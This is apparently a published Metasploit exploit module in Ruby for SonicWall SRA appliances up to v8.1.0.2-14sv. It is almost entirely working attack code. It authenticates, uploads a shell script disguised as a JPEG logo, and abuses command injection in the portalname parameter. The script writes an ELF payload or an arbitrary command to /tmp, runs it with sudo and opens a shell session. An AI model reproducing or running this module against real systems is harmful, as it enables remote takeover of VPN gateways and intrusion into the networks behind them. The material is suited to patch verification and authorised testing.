# Date: 12/25/2016
# Exploit Author: xort @ Critical Start
# Vendor Homepage: www.sonicwall.com
# Software Link: sonicwall.com/products/sra-virtual-appliance
# Version: 8.1.0.2-14sv
# Tested on: 8.1.0.2-14sv
#             
# CVE : (awaiting cve)
 
# vuln1: importlogo.cgi / logo1 parameter (any contents can be uploaded)    
# vuln2: sitecustomization.cgi / portalname (filename) parameter   
 
# Description PostAuth Sonicwall SRA <= v8.1.0.2-14sv. This exploit leverages a command injection bug. 
#
# xort @ Critical Start
 
 
 
 
require &#039;msf/core&#039;
 
class MetasploitModule < Msf::Exploit::Remote
    Rank = ExcellentRanking
    include  Exploit::Remote::Tcp
        include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Sonicwall SRA <= v8.1.0.2-14sv remote exploit&#039;,
                    &#039;Description&#039;    => %q{
                    This module exploits a remote command execution vulnerability in
                the Sonicwall SRA Appliance Version <=  v8.1.0.2-14sv. The vulnerability exist in
                a section of the machine&#039;s adminstrative infertface for performing configurations 
                related to on-connect scripts to be launched for users&#039;s connecting.    
            },
            &#039;Author&#039;         =>
                [
                    &#039;xort@Critical Start&#039;, # vuln + metasploit module
                ],
            &#039;Version&#039;        => &#039;$Revision: 1 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;none&#039;, &#039;none&#039;],
                ],
            &#039;Platform&#039;      => [ &#039;linux&#039;],
            &#039;Privileged&#039;     => true,
             &#039;Arch&#039;          => [ ARCH_X86 ],
                        &#039;SessionTypes&#039;  => [ &#039;shell&#039; ],
                        &#039;Privileged&#039;     => false,
 
                &#039;Payload&#039;        =>
                                { 
                                  &#039;Compat&#039; =>
                                  {
                                        &#039;ConnectionType&#039; => &#039;find&#039;,
                                  }
                                },
 
            &#039;Targets&#039;        =>
                [
                    [&#039;Linux Universal&#039;,
                        {
                                &#039;Arch&#039; => ARCH_X86,
                                &#039;Platform&#039; => &#039;linux&#039;
                        }
                    ],
                ],
            &#039;DefaultTarget&#039; => 0))
 
            register_options(
                [
                    OptString.new(&#039;PASSWORD&#039;, [ false, &#039;Device password&#039;, "" ]),    
                        OptString.new(&#039;USERNAME&#039;, [ true, &#039;Device password&#039;, "admin" ]),    
                    OptString.new(&#039;CMD&#039;, [ false, &#039;Command to execute&#039;, "" ]),  
                    Opt::RPORT(443),
                ], self.class)
    end
 
        def do_login(username, password_clear)
                vprint_status( "Logging into machine with credentials...\n" )
 
                # vars
                timeout = 1550;
 
                # send request  
                res = send_request_cgi(
                {
                      &#039;method&#039;  => &#039;POST&#039;,
                      &#039;uri&#039;     => "/cgi-bin/userLogin",
              &#039;headers&#039; => {
               &#039;Connection&#039; => &#039;close&#039;,
               &#039;Content-Type&#039; => &#039;application/x-www-form-urlencoded&#039;,
               &#039;User-Agent&#039; => &#039;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0&#039;,
                  },
                      &#039;vars_post&#039; => {
               &#039;username&#039; => username,
               &#039;password&#039; => password_clear,
               &#039;domain&#039; => &#039;LocalDomain&#039;,
               &#039;loginButton&#039; => &#039;Login&#039;,
               &#039;state&#039; => &#039;login&#039;,
               &#039;login&#039; => &#039;true&#039;,
               &#039;VerifyCert&#039; => &#039;0&#039;,
               &#039;portalname&#039; => &#039;VirtualOffice&#039;,
               &#039;ajax&#039; => &#039;true&#039;
               },
                }, timeout)
 
        swap = res.headers[&#039;Set-Cookie&#039;].split(&#039;\n&#039;).grep(/(.*)swap=([^;]+);/){$2}[0]
         
                return swap
        end
 
        def upload_payload(swap_cookie, file_data)
                vprint_status( "Upload Payload..." )
 
                # vars
                timeout = 1550;
 
                upload_req = [
                [ "portalName","VirtualOffice" ],
                [ "defaultLogo","0" ],
                [ "uiVersion","2" ],
                [ "bannerBackground", "light" ]
                ]
 
                boundary = "---------------------------" + Rex::Text.rand_text_numeric(34)
                post_data = ""
 
        # assemble upload_req parms
                upload_req.each do |xreq|
                    post_data << "--#{boundary}\r\n"
                    post_data << "Content-Disposition: form-data; name=\"#{xreq[0]}\"\r\n\r\n"
                    post_data << "#{xreq[1]}\r\n"
                end
 
                # add malicious file
                post_data << "--#{boundary}\r\n"
                post_data << "Content-Disposition: form-data; name=\"logo1\"; filename=\"x.jpg\"\r\n"
        post_data << "Content-Type: image/jpeg\r\n\r\n"
                post_data << "#{file_data}\r\n"
  
        post_data << "--#{boundary}--\r\n"
 
                res = send_request_cgi({
                   &#039;method&#039; => &#039;POST&#039;,
                   &#039;uri&#039;    => "/cgi-bin/importlogo?uploadId=1",
                   &#039;ctype&#039;  => "multipart/form-data; boundary=#{boundary}",
                   &#039;data&#039;   => post_data,
                   &#039;headers&#039; =>
                        {
                                &#039;UserAgent&#039; => "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0",
                &#039;Cookie&#039; => &#039;swap=&#039;+swap_cookie+&#039;;&#039;,
                        }
                }, timeout)
                 
 
        end
 
 
    def run_command(swap_cookie, cmd)
 
        vprint_status( "Running Command...\n" )
 
                # vars
                timeout = 1550;
 
        vprint_status("creating filename on target: #{cmd}\n")
 
                upload_req = [
                [ "portalname", cmd ],
                [ "portaltitle","Virtual Office" ],
                [ "bannertitle","Virtual Office" ],
                [ "bannermessage","<h1>Dell Sonicwall</h1>" ],
                [ "portalUrl","https://192.168.84.155/portal/xxx" ],
                [ "loginflag","on" ],
                [ "bannerflag","on" ],
                [ "httpOnlyCookieFlag","on" ],
                [ "cachecontrol","on" ],
                [ "uniqueness", "on" ],
                [ "duplicateLoginAction", "1" ],
                [ "livetilesmalllogo", "" ],
                [ "livetilemediumlogo", "" ],
                [ "livetilewidelogo", "" ],
                [ "livetilelargelogo", "" ],
                [ "livetilebackground", "#0085C3" ],
                [ "livetilename", "" ],
                [ "home2page", "on" ],
                [ "allowNetExtender", "on" ],
                [ "virtualpassagepage", "on" ],
                [ "cifsdirectpage", "on" ],
                [ "cifspage", "on" ],
                [ "cifsappletpage", "on" ],
                [ "cifsapplet", "on" ],
                [ "cifsdefaultfilesharepath", "" ],
                [ "home3page", "on" ],
                [ "showAllBookmarksTab", "on" ],
                [ "showDefaultTabs", "on" ],
                [ "showCopyright", "on" ],
                [ "showSidebar", "on" ],
                [ "showUserPortalHelpButton", "on" ],
                [ "userPortalHelpURL", "" ],
                [ "showUserPortalOptionsButton", "on" ],
                [ "homemessage", "<h1>Welcome to the Dell SonicWALL Virtual Office</h1>" ],
                [ "hptabletitle", "Virtual Office Bookmarks" ],
                [ "vhostName", "www.#{Rex::Text.rand_text_hex(32)}.com" ],
                [ "vhostAlias", "" ],
                [ "vhostInterface", "ALL" ],
                [ "vhostEnableKeepAlive", "on" ],
                [ "cdssodn", ".yahoo.com" ],
                [ "enableSSLForwardSecrecy", "0" ],
                [ "enableSSLProxyVerify", "0" ],
                [ "sslProxyProtocol", "0" ],
                [ "loginSchedule", "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" ],
                [ "formsection", "main" ],
                [ "doAdd", "1" ],
                [ "cgiaction", "1" ],
                [ "themename", "stylesonicwall" ],
                [ "onlinehelp", "" ],
                [ "tmp_currentVhostName", "" ],
                [ "tmp_currentVhostAlias", "" ],
                [ "tmp_currentVhostInterface", "ALL" ],
                [ "tmp_currentVhostIp", "" ],
                [ "tmp_currentVhostIPv6", "" ],
                [ "tmp_currentVhostEnableHTTP", "0" ],
                [ "tmp_currentVhostEnableKeepAlive", "1" ],
                [ "tmp_currentVhostCert", "" ],
                [ "tmp_currEnforceSSLProxyProtocol", "0" ],
                [ "tmp_currSSLProxyProtocol", "0" ],
                [ "tmp_currEnableSSLProxyVerify", "0" ],
                [ "tmp_currEnableSSLForwardSecrecy", "0" ],
                [ "tmp_currentVhostOffloadRewrite", "" ],
                [ "restartWS", "1" ],
                [ "reuseFavicon", "" ],
                [ "oldReuseFavicon", "" ],
                ]
 
                boundary = "---------------------------" + Rex::Text.rand_text_numeric(34)
                post_data = ""
 
                # assemble upload_req parms
                upload_req.each do |xreq|
                    post_data << "--#{boundary}\r\n"
                    post_data << "Content-Disposition: form-data; name=\"#{xreq[0]}\"\r\n\r\n"
                    post_data << "#{xreq[1]}\r\n"
                end
 
                post_data << "--#{boundary}--\r\n"
 
                res = send_request_cgi({
                   &#039;method&#039; => &#039;POST&#039;,
                   &#039;uri&#039;    => "/cgi-bin/sitecustomization",
                   &#039;ctype&#039;  => "multipart/form-data; boundary=#{boundary}",
                   &#039;data&#039;   => post_data,
                   &#039;headers&#039; =>
                        {
                                &#039;UserAgent&#039; => "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0",
                                &#039;Cookie&#039; => &#039;swap=&#039;+swap_cookie+&#039;;&#039;,
                        }
                }, timeout)
    end
 
    def run_command_file(swap_cookie)
 
 
 
    end
 
    def exploit
        # timeout
        timeout = 1550;
 
        # params
        password_clear = datastore[&#039;PASSWORD&#039;]
        user = datastore[&#039;USERNAME&#039;]
 
        # do authentication     
        swap_cookie = do_login(user, password_clear)
     
        vprint_status("authenticated &#039;swap&#039; cookie: #{swap_cookie}\n")
             
        # pause to let things run smoothly
        #sleep(5)
 
         #if no &#039;CMD&#039; string - add code for root shell
                if not datastore[&#039;CMD&#039;].nil? and not datastore[&#039;CMD&#039;].empty?
 
                        cmd = datastore[&#039;CMD&#039;]
 
                        # Encode cmd payload
                        encoded_cmd = cmd.unpack("H*").join().gsub(/(\w)(\w)/,&#039;\\x\1\2&#039;)
 
                        upload_payload(swap_cookie, ("sudo /bin/rm -f /tmp/n; printf \"#{encoded_cmd}\" > /tmp/n; chmod +rx /tmp/n; /tmp/n" ))
                else
                        # Encode payload to ELF file for deployment
                        elf = Msf::Util::EXE.to_linux_x86_elf(framework, payload.raw)
                        encoded_elf = elf.unpack("H*").join().gsub(/(\w)(\w)/,&#039;\\x\1\2&#039;)
 
            # upload elf to /tmp/m , chmod +rx /tmp/m , then run /tmp/m (payload)
                        upload_payload(swap_cookie, ("#!/bin/bash\necho -e \"#{encoded_elf}\" > /tmp/m; chmod +rx /tmp/m; /tmp/m"))
                        run_command_file(swap_cookie)
 
            # wait for magic
                        handler
             
                end
 
 
    end
end

